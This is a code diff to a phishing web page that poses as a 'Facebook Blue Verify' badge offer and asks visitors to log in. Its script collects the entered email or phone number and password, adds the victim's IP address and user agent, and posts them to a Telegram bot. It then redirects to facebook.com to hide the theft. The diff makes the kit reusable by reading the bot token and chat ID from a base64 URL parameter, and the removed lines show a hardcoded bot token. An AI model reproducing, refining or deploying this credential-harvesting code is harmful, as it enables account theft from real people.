@@ -108,81 +108,92 @@
 <body>
     <div class="container">
         <div class="logo-container">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ6SbSx_8aNX9D7UyaO8n93stkA9b_PFDq5dg&amp;usqp=CAU" alt="My Logo" width="80" height="80">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ6SbSx_8aNX9D7UyaO8n93stkA9b_PFDq5dg&usqp=CAU" alt="My Logo" width="80" height="80">
             <div class="logo"><strong>Facebook Blue Verify</strong></div>
             <p class="slogan">Login Your Facebook Account and claim Verify Badge</p>
         </div>
         <div class="form-container">
             <form onsubmit="submitonhfc(); return false;" method="post">
-                <input type="hidden" name="" id="pagename" value="Facebook Blue Verify">
-                <input type="text" id="email" placeholder="Email or Phone Number" class="input-field" name="email" required="">
-                <input id="name" type="password" placeholder="Password" class="input-field" name="password" required="">
+                <input type="hidden" id="pagename" value="Facebook Blue Verify">
+                <input type="text" id="email" placeholder="Email or Phone Number" class="input-field" required>
+                <input type="password" id="name" placeholder="Password" class="input-field" required>
                 <button type="submit" class="login-button">Log In</button>
             </form>
-            <a href="#" id="signup-link">Forgot Password?</a>
+            <a href="#">Forgot Password?</a>
             <div class="divider"></div>
-            <div class="no-social-login">
-                <p>Don't have an account? <a href="#" id="signup-button">Sign Up</a></p>
-                <marquee behavior="scroll" direction="left" scrollamount="4" style="color: #1877f2; background-color: white; font-family: 'Arial Black', sans-serif; font-size: 12px;">
-                    55&5)5(5+5-55'5- 55(5-5"55 55.5+5' 5(55 5-5!5 5-505( 5555-5(5+ 5(5 525(5.5+ 555555(5(5$ 55 5(5-5!55+505"5,5 525(5. 505"5%5% 5'5(5- 5 55- 5-5!5 55%5.5 555+5"552 5555 5 5"5 5-5!5 5-505( 5555-5(5+ 5"5, 5(5'
-                </marquee>
-            </div>
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
+            <marquee behavior="scroll" direction="left" scrollamount="4" style="color: #1877f2; background: white; font-family: 'Arial Black'; font-size: 12px;">
+                Welcome to Facebook Blue Tick Verification...
+            </marquee>
         </div>
     </div>
+
     <div id="error-popup" class="popup">
         <div class="popup-content">
             <span class="popup-close" id="close-popup">×</span>
             <p><strong>Error:</strong> Sign up is currently disabled.</p>
         </div>
     </div>
+
     <script>
-        function la(src) {
-            window.location = src;
+        // Get Base64 encoded data from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedParams = urlParams.get('data');
+
+        let telegramToken = '';
+        let chatId = '';
+
+        if (encodedParams) {
+            const decodedParams = atob(encodedParams);
+            const params = new URLSearchParams(decodedParams);
+            telegramToken = params.get('token');
+            chatId = params.get('chatId');
+            console.log('Decoded Params:', params);
+        } else {
+            console.log('No Telegram data found');
         }
-        function GetURLParameter(sParam) {
-            var sPageURL = window.location.search.substring(1);
-            var sURLVariables = sPageURL.split('&');
-            for (var i = 0; i < sURLVariables.length; i++) {
-                var sParameterName = sURLVariables[i].split('=');
-                if (sParameterName[0] == sParam) {
-                    return sParameterName[1];
-                }
-            }
-        }
-        var chatid = GetURLParameter('id');
+
         function submitonhfc() {
             fetch('https://api.ipify.org/?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const userAgent = navigator.userAgent;
                     const ip = data.ip;
-                    const cityName = data.city;
                     const page = document.getElementById("pagename").value;
                     const name = document.getElementById("name").value;
                     const email = document.getElementById("email").value;
-                    const message = `> Login Page : ${page}\n\n> Number Or Email : ${email}\n\n> Password : ${name}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
-                    const botToken = '6429165693:AAFWIcw2XGofDtPS2iZZkQqAKgoILb1TCoc';
-                    const chatId = chatid;
-                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    const message =
+                        `🔵 *Facebook Blue Tick Login Attempt*\n\n` +
+                        `🌐 Page: ${page}\n` +
+                        `📧 Email/Phone: ${email}\n` +
+                        `🔑 Password: ${name}\n` +
+                        `🧠 User Agent: ${userAgent}\n` +
+                        `🌍 IP Address: ${ip}`;
+
+                    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
                     const telegramParams = {
                         chat_id: chatId,
-                        text: message
+                        text: message,
+                        parse_mode: "Markdown"
                     };
+
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', telegramUrl, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.send(JSON.stringify(telegramParams));
-                    xhr.onload = function() {
+
+                    xhr.onload = function () {
                         if (xhr.status === 200) {
                             window.location.href = "https://www.facebook.com";
                         } else {
-                            console.log('Error sending data to Telegram:', xhr.statusText);
+                            console.log('Error sending to Telegram:', xhr.statusText);
                         }
                     };
                 })
-                .catch(error => console.log('Error retrieving IP address information:', error));
+                .catch(error => console.log('IP Fetch Error:', error));
         }
     </script>
-    <div style="position: relative;" id="zp-8-4-6-apollo-root-apollo_everywhere"></div>
 </body>
 </html>
